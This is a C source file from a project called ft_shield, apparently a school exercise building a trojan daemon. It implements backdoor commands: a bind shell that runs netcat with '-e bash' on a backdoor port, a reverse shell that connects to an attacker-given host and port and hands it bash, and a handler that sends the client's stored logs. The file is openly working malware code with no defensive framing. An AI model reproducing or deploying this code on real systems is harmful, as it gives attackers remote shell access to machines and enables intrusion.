#include "../includes/ft_shield.h"
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

void command_shell(t_server* server, t_client* client) {
    pid_t pid;

    pid = fork();
    if (pid == 0) {

        char port[5];
        sprintf(port, "%d", BACKDOOR_PORT);
        
        // redirects the standard file descriptors of the new process to the client communication socket
        for (int i = 0 ; i < 3 ; i++) {
            if (dup2(client->socket, i) == -1)
                exit(EXIT_FAILURE);
        }
        
        if (execlp("nc", "nc", "-lp", port, "-e", BASH_PATH, NULL) == -1)
            exit(EXIT_FAILURE);
    }

    send(client->socket, BACKDOOR_MSG, BACKDOOR_MSG_LEN, 0);
    delete_client(server, client->socket);
}

void command_reverse_shell(t_server* server, t_client* client, char* rhost, char* rport) {
    
    pid_t pid;

    pid = fork();
    if (pid == 0) {
        struct sockaddr_in sa;
        int s;

        bzero(&sa, sizeof(sa));

        sa.sin_family = AF_INET;
        sa.sin_addr.s_addr = inet_addr(rhost);
        sa.sin_port = htons(atoi(rport));

        if ((s = socket(AF_INET, SOCK_STREAM, 0)) < 0)
            exit(EXIT_FAILURE);

        if (connect(s, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
            close(s);
            exit(EXIT_FAILURE);
        }

        for (int i = 0 ; i < 3 ; i++) {
            if (dup2(s, i) == -1) {
                close(s);
                exit(EXIT_FAILURE);
            }
        }

        if (execlp(BASH_PATH, "bash", (char *)NULL) == -1) {
            close(s);
            exit(EXIT_FAILURE);
        }
    }

    send(client->socket, RSHELL_MSG, RSHELL_MSG_LEN, 0);
    // delete_client(server, client->socket);
    (void)server;
}

void command_log(t_server* server, t_client* client) {
    if (send(client->socket, "****** LOGS ******\n", 19, 0) < 0 )
        delete_client(server, client->socket);

    if (send(client->socket, client->logs, strlen(client->logs), 0) < 0)
        delete_client(server, client->socket);
}